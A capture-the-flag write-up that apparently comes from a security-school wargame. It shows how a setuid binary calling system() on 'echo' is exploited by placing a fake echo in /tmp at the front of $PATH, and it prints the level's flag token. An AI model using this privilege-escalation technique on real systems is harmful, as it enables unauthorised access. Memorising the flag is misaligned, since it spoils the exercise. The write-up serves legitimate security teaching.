# Level 03

## Resolution

As `level03` if we run `ls` we see that a `level03` binary is present in the home directory.

```shell
  $> ./level03
  Exploit me
```

> In order to exploit this binary, we need to know what it does.

Using [`ltrace`](https://man7.org/linux/man-pages/man1/ltrace.1.html), we can grasp what the program does by showing us system and dynamic library calls.

```shell
  $> ltrace ./level03
  __libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
  getegid()                                                                  = 2003
  geteuid()                                                                  = 2003
  setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                        = 0   
  setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                        = 0   
  system("/usr/bin/env echo Exploit me"Exploit me
  <unfinished ...>
  --- SIGCHLD (Child exited) ---
  <... system resumed> )                                                     = 0
  +++ exited (status 0) +++
```

> As we can see this program checks effective GID and UID before setting them back to the same values so we don't care about this part.

We need to focus on the [`system()`](https://man7.org/linux/man-pages/man3/system.3.html) call that basically execute a string as a shell command. It is known to be exploitable and it is the case here because [`echo`](https://linux.die.net/man/1/echo) is involved here. We simply need to override what `echo` stands for by adding at the beginning of the **$PATH** another version of it.

```shell
  $> echo "/bin/getflag" > /tmp/echo
  $> chmod 777 /tmp/echo && export PATH=/tmp:$PATH
```

> It would work for anything else that is supposed to be evaluated through `$PATH` as well. Because this variable is an ordered list of directories to look through to find executable files, the first occurence that matches will be used as source of truth.

Let's check details about this binary with `ls -l level03`...

```shell
  $> ls -l level03
  -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03 
```

> Since this program is owned by `flag03`, overriding `echo` by `getflag` will work correctly because the binary is executed as `flag03` who has the right to run this command.

Finally, run the binary once more to get this level's flag.
```shell
  $> ./level03 
  Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

So, `qi0maab88jeaj46qoumi7maus` is the flag for this level.

## Ressources

- [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html)
- [system](https://man7.org/linux/man-pages/man3/system.3.html)
- [$PATH](https://medium.com/@jalendport/what-exactly-is-your-shell-path-2f076f02deb4)

